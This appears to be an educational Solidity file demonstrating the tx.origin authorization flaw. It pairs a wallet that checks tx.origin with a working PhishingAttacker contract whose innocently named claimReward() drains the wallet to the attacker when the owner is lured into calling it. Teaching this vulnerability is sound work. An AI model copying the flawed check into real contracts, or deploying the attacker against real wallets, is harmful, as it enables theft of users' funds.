// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title TxOriginWallet
/// @notice DELIBERATELY INSECURE — for educational purposes only.
///         Uses `tx.origin` for authorization instead of `msg.sender`.
///         This is a classic phishing vector: a malicious contract can
///         trick the real owner into calling IT, which then forwards
///         the call to this wallet — and tx.origin still shows the
///         REAL owner's address, even though the owner never directly
///         called this contract.
contract TxOriginWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /// @notice THE BUG: checks tx.origin (the address that started the
    ///         ENTIRE transaction chain) instead of msg.sender (the
    ///         address that called THIS function directly).
    function withdrawAll(address to) external {
        require(tx.origin == owner, "Not authorized");
        payable(to).transfer(address(this).balance);
    }

    receive() external payable {}
}

/// @title PhishingAttacker
/// @notice Lures the real owner into calling `claimReward()` — something
///         that sounds harmless/enticing — which secretly forwards the
///         call into the victim wallet. Since the OWNER is the one who
///         ultimately initiated the transaction, tx.origin still equals
///         the owner's address, and the vulnerable check passes.
contract PhishingAttacker {
    TxOriginWallet public target;
    address public attackerAddress;

    constructor(address payable _target) {
        target = TxOriginWallet(_target);
        attackerAddress = msg.sender;
    }

    /// @notice Disguised as something innocent — the owner is tricked
    ///         (e.g. via a phishing site) into calling this function.
    function claimReward() external {
        // The owner called THIS function, so msg.sender here is the owner.
        // But tx.origin is ALSO the owner, since they started the tx chain.
        target.withdrawAll(attackerAddress);
    }
}
